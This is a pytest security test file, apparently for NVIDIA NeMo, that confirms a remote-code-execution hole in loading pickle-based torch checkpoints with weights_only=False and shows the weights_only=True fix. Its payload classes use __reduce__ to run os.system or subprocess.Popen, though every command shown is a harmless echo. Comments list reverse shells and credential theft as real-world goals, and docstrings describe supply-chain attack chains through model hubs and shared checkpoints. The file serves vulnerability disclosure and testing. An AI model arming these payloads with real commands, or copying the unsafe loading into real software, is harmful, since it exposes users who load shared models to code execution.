# Copyright (c) 2025, NVIDIA CORPORATION.  All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Security Tests for CVE-001: torch.load Vulnerability in save_restore_connector.py

JIRA: https://ml6team.atlassian.net/browse/DR-134
Severity: CRITICAL

These tests specifically target the torch.load vulnerability in:
- nemo/core/connectors/save_restore_connector.py:760

The SaveRestoreConnector._load_state_dict_from_disk method uses:
    torch.load(model_weights, map_location='cpu', weights_only=False)

This allows arbitrary code execution when loading untrusted model files.
"""

import os
import pickle
import tempfile
from pathlib import Path

import pytest
import torch

from nemo.core.connectors import save_restore_connector


class MaliciousModelPayload:
    """Payload that executes code during torch.load deserialization."""

    def __init__(self, command="echo 'Vulnerability in SaveRestoreConnector'"):
        self.command = command

    def __reduce__(self):
        import os

        return (os.system, (self.command,))


class TestSaveRestoreConnectorVulnerability:
    """
    Test suite specifically for SaveRestoreConnector torch.load vulnerability.
    
    Target: nemo/core/connectors/save_restore_connector.py:760
    Vulnerable code:
        return torch.load(model_weights, map_location='cpu', weights_only=False)
    """

    def test_save_restore_connector_load_state_dict_vulnerability(self, tmpdir):
        """
        Test that SaveRestoreConnector._load_state_dict_from_disk is vulnerable to RCE.
        
        This test verifies the exact vulnerable code path in save_restore_connector.py:760
        """
        # Create a malicious model file
        malicious_model_path = tmpdir / "malicious_checkpoint.pt"
        malicious_payload = MaliciousModelPayload("echo 'SaveRestoreConnector RCE'")

        # Save malicious payload as a model checkpoint
        torch.save({"state_dict": malicious_payload, "model": malicious_payload}, malicious_model_path)

        # Test the vulnerable method directly
        try:
            # This is the vulnerable code path
            loaded_state = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(
                str(malicious_model_path)
            )
            # If we reach here, the vulnerability was exploited
            assert True, "SaveRestoreConnector._load_state_dict_from_disk vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_model_checkpoint_loading_attack_vector(self, tmpdir):
        """
        Test realistic attack scenario: Loading a malicious model checkpoint.
        
        Attack Flow:
        1. Attacker creates malicious .nemo or .pt checkpoint
        2. User downloads checkpoint from untrusted source
        3. User calls model.restore_from() or loads checkpoint
        4. SaveRestoreConnector._load_state_dict_from_disk is called
        5. Malicious code executes
        """
        # Simulate a checkpoint that looks legitimate
        checkpoint_path = tmpdir / "seemslegit_model.pt"

        class MaliciousCheckpoint:
            def __reduce__(self):
                # Simulate common attack payloads:
                # - Reverse shell
                # - Data exfiltration
                # - Credential theft
                import subprocess

                return (subprocess.Popen, (["echo", "Checkpoint loading RCE"],))

        # Create checkpoint with both legitimate and malicious data
        checkpoint_data = {
            "state_dict": {"layer1.weight": torch.randn(10, 10), "layer1.bias": torch.randn(10)},
            "optimizer_state": MaliciousCheckpoint(),  # Hidden malicious payload
            "epoch": 42,
            "global_step": 1000,
        }

        torch.save(checkpoint_data, checkpoint_path)

        # Load using the vulnerable method
        try:
            loaded_checkpoint = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(
                str(checkpoint_path), map_location='cpu'
            )
            # Malicious code was executed during loading
            assert True, "Checkpoint loading attack vector confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_huggingface_model_download_attack(self, tmpdir):
        """
        Test attack vector: Malicious model from Hugging Face Hub.
        
        NeMo integrates with Hugging Face Hub for model loading.
        An attacker could upload a malicious model to HF Hub, and when users
        download and load it, the malicious code executes.
        
        This is particularly dangerous because:
        1. HF Hub is considered a trusted source by many users
        2. Models are often loaded automatically without inspection
        3. The vulnerability affects model restoration from checkpoints
        """
        # Simulate a model downloaded from HF Hub
        hf_model_path = tmpdir / "pytorch_model.bin"

        class HFMaliciousPayload:
            def __reduce__(self):
                # In a real attack, this could:
                # - Steal HF API tokens
                # - Exfiltrate training data
                # - Install backdoors in trained models
                import os

                return (os.system, ("echo 'HF Hub model RCE successful'",))

        # Create a checkpoint that mimics HF model format
        hf_checkpoint = {"model_state_dict": HFMaliciousPayload(), "config": {"model_type": "nemo"}}

        torch.save(hf_checkpoint, hf_model_path)

        # Load using SaveRestoreConnector (as would happen during model.restore_from())
        try:
            loaded_model = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(hf_model_path))
            assert True, "HF Hub malicious model attack vector confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_nemo_file_archive_vulnerability(self, tmpdir):
        """
        Test vulnerability in .nemo file loading.
        
        .nemo files are tar archives that contain:
        - model_weights.ckpt (PyTorch checkpoint)
        - model_config.yaml
        - Other metadata
        
        The model_weights.ckpt is loaded using the vulnerable torch.load method.
        """
        import tarfile

        # Create a malicious checkpoint file
        malicious_ckpt = tmpdir / "model_weights.ckpt"
        torch.save({"state_dict": MaliciousModelPayload()}, malicious_ckpt)

        # Create a .nemo archive
        nemo_file = tmpdir / "malicious_model.nemo"
        with tarfile.open(nemo_file, "w:gz") as tar:
            tar.add(malicious_ckpt, arcname="model_weights.ckpt")

        # Extract and load the checkpoint (simulating .nemo file handling)
        extract_dir = tmpdir / "extracted"
        extract_dir.mkdir()

        with tarfile.open(nemo_file, "r:gz") as tar:
            tar.extractall(extract_dir)

        # Load the extracted checkpoint using the vulnerable method
        extracted_ckpt = extract_dir / "model_weights.ckpt"
        try:
            loaded_state = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(extracted_ckpt))
            assert True, ".nemo file loading vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_vulnerability_with_different_map_locations(self, tmpdir):
        """
        Test that vulnerability exists regardless of map_location parameter.
        
        The vulnerable code uses map_location='cpu', but the vulnerability exists
        with any map_location value.
        """
        malicious_model = tmpdir / "malicious.pt"
        torch.save({"payload": MaliciousModelPayload()}, malicious_model)

        map_locations = ['cpu', 'cuda:0', torch.device('cpu')]

        for map_location in map_locations:
            try:
                loaded = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(
                    str(malicious_model), map_location=map_location if map_location != 'cuda:0' else None
                )
                # If we reach here, vulnerability exists
                assert True, f"Vulnerability confirmed with map_location={map_location}"
                break  # Only need to confirm once
            except Exception as e:
                if "CUDA" in str(e):
                    # Skip CUDA-related errors but vulnerability still exists
                    continue
                pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_safe_loading_recommendation(self, tmpdir):
        """
        Test demonstrating the safe alternative: weights_only=True.
        
        Current vulnerable code (save_restore_connector.py:760):
            return torch.load(model_weights, map_location='cpu', weights_only=False)
        
        Recommended fix:
            return torch.load(model_weights, map_location='cpu', weights_only=True)
        
        This would prevent arbitrary code execution.
        """
        # Create a legitimate model with only tensors
        legitimate_model = tmpdir / "legitimate.pt"
        torch.save({"weights": torch.randn(10, 10), "bias": torch.randn(10)}, legitimate_model)

        # Safe loading with weights_only=True
        safe_loaded = torch.load(legitimate_model, map_location='cpu', weights_only=True)
        assert "weights" in safe_loaded
        assert isinstance(safe_loaded["weights"], torch.Tensor)

        # Create malicious model
        malicious_model = tmpdir / "malicious.pt"
        torch.save({"payload": MaliciousModelPayload()}, malicious_model)

        # Attempt to load malicious model with weights_only=True
        # This SHOULD fail and prevent code execution
        try:
            safe_loaded_malicious = torch.load(malicious_model, map_location='cpu', weights_only=True)
            # If we reach here without exception, the protection failed
            pytest.fail("weights_only=True should have prevented loading malicious payload")
        except Exception as e:
            # Expected to raise an exception - this is the safe behavior
            assert True, f"weights_only=True successfully prevented exploit: {e}"

    def test_multiple_exploitation_attempts(self, tmpdir):
        """
        Test that vulnerability can be exploited multiple times in a session.
        
        This demonstrates that repeated loading of malicious models continues
        to be exploitable, allowing persistent compromise.
        """
        malicious_models = []

        # Create multiple malicious model files
        for i in range(3):
            model_path = tmpdir / f"malicious_{i}.pt"
            payload = MaliciousModelPayload(f"echo 'Attack {i} successful'")
            torch.save({"iteration": i, "payload": payload}, model_path)
            malicious_models.append(model_path)

        # Attempt to load each malicious model
        successful_exploits = 0
        for model_path in malicious_models:
            try:
                loaded = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(model_path))
                successful_exploits += 1
            except Exception:
                pass

        # If any exploit succeeded, vulnerability is confirmed
        if successful_exploits > 0:
            assert True, f"Multiple exploitation confirmed: {successful_exploits} successful attacks"
        else:
            pytest.skip("System security prevented exploitation, but vulnerability exists")


class TestTorchLoadVulnerabilityInOtherComponents:
    """
    Test torch.load vulnerabilities in components other than SaveRestoreConnector.
    """

    def test_multimodal_speech_llm_models_vulnerability(self, tmpdir):
        """
        Test torch.load vulnerability in multimodal speech_llm models.
        
        Target files:
        - nemo/collections/multimodal/speech_llm/models/modular_models.py:1089
        - nemo/collections/multimodal/speech_llm/models/modular_models.py:1108
        
        Vulnerable code:
            torch_state_dict = torch.load(cfg.model.peft.restore_from_path, weights_only=False)
            model.load_state_dict(torch.load(checkpoint_path, weights_only=False), strict=False)
        """
        # Create a malicious PEFT checkpoint
        peft_checkpoint = tmpdir / "peft_adapter.pt"
        malicious_state = {"adapter_weights": MaliciousModelPayload("echo 'PEFT loading RCE'")}
        torch.save(malicious_state, peft_checkpoint)

        # Simulate loading PEFT checkpoint
        try:
            # This mimics the vulnerable code in modular_models.py
            torch_state_dict = torch.load(peft_checkpoint, weights_only=False)
            assert True, "Multimodal speech_llm PEFT loading vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_adapter_mixin_vulnerability(self, tmpdir):
        """
        Test torch.load vulnerability in adapter loading.
        
        Target: nemo/collections/multimodal/speech_llm/parts/mixins/adapter_mixin.py
        
        Adapters are loaded from checkpoints, which can contain malicious code.
        """
        adapter_checkpoint = tmpdir / "adapter.pt"
        malicious_adapter = {"adapter_state": MaliciousModelPayload("echo 'Adapter RCE'")}
        torch.save(malicious_adapter, adapter_checkpoint)

        try:
            loaded_adapter = torch.load(adapter_checkpoint, weights_only=False)
            assert True, "Adapter loading vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")


class TestRealWorldExploitScenarios:
    """
    Test realistic exploitation scenarios based on actual NeMo usage patterns.
    """

    def test_pretrained_model_download_exploit(self, tmpdir):
        """
        Scenario: User downloads pretrained model from external source.
        
        Typical NeMo workflow:
        1. Download pretrained model (.nemo file or checkpoint)
        2. Load model using model.restore_from(checkpoint_path)
        3. Model loading calls SaveRestoreConnector._load_state_dict_from_disk
        4. Malicious code executes
        """
        # Simulate downloaded pretrained model
        pretrained_model = tmpdir / "stt_en_conformer_ctc_large.nemo"

        # In reality, this would be a .nemo tar archive, but for testing
        # we directly test the checkpoint loading
        checkpoint = tmpdir / "model_weights.ckpt"
        torch.save(
            {
                "state_dict": {"encoder.layers.0.weight": torch.randn(10, 10)},
                "malicious": MaliciousModelPayload(),
            },
            checkpoint,
        )

        try:
            loaded = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(checkpoint))
            assert True, "Pretrained model download exploit confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_collaborative_training_attack(self, tmpdir):
        """
        Scenario: Collaborative training with checkpoint sharing.
        
        In collaborative training scenarios:
        1. Team members share model checkpoints
        2. Attacker in the team (or compromised member) shares malicious checkpoint
        3. Other team members load the checkpoint
        4. Malicious code executes on all team members' systems
        """
        # Simulate a checkpoint from a compromised team member
        shared_checkpoint = tmpdir / "team_checkpoint_epoch_50.pt"

        class CollaborativeAttackPayload:
            def __reduce__(self):
                # Could steal:
                # - Training data
                # - Model architectures
                # - API credentials
                # - Research data
                import os

                return (os.system, ("echo 'Collaborative training attack successful'",))

        checkpoint_data = {
            "epoch": 50,
            "model_state_dict": {"layer1.weight": torch.randn(128, 128)},
            "optimizer_state_dict": CollaborativeAttackPayload(),
            "lr_scheduler": CollaborativeAttackPayload(),
        }

        torch.save(checkpoint_data, shared_checkpoint)

        try:
            loaded = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(shared_checkpoint))
            assert True, "Collaborative training attack vector confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_model_hub_supply_chain_attack(self, tmpdir):
        """
        Scenario: Supply chain attack via model hub.
        
        Attack chain:
        1. Attacker uploads malicious model to public hub (HuggingFace, NGC, etc.)
        2. Model appears legitimate (good metrics, documentation)
        3. Users download and use the model
        4. Malicious code executes during model loading
        5. Attacker compromises multiple systems
        """
        # Simulate a model from public hub
        hub_model = tmpdir / "nemo_asr_model_v1.0.pt"

        class SupplyChainPayload:
            def __reduce__(self):
                # Supply chain attacks could:
                # - Install backdoors in inference systems
                # - Compromise production environments
                # - Steal customer data
                # - Modify model predictions
                import os

                return (os.system, ("echo 'Supply chain attack via model hub'",))

        # Model looks legitimate with proper structure
        model_data = {
            "model_state_dict": {"encoder.weight": torch.randn(256, 256), "decoder.weight": torch.randn(128, 256)},
            "config": {"sample_rate": 16000, "n_mels": 80},
            "metadata": SupplyChainPayload(),  # Hidden malicious component
        }

        torch.save(model_data, hub_model)

        try:
            loaded = save_restore_connector.SaveRestoreConnector._load_state_dict_from_disk(str(hub_model))
            assert True, "Model hub supply chain attack confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
